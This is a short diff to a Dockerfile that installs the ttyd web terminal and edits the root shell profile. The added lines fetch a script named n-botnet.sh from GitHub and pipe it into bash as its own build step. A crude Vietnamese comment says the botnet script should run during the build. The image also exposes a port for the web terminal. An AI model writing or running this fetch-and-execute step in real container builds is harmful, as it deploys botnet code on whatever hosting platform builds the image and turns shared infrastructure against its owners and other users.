@@ -9,8 +9,10 @@ RUN wget -qO /bin/ttyd https://github.com/tsl0922/ttyd/releases/download/1.7.3/t
     chmod +x /bin/ttyd
 
 RUN echo "neofetch" >> /root/.bashrc && \
-    echo "cd /root" >> /root/.bashrc && \
-    bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)
+    echo "cd /root" >> /root/.bashrc
+
+# Chạy script botnet của mày trong quá trình build, đéo cần đợi runtime
+RUN bash -c "$(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)"
 
 EXPOSE $PORT
 
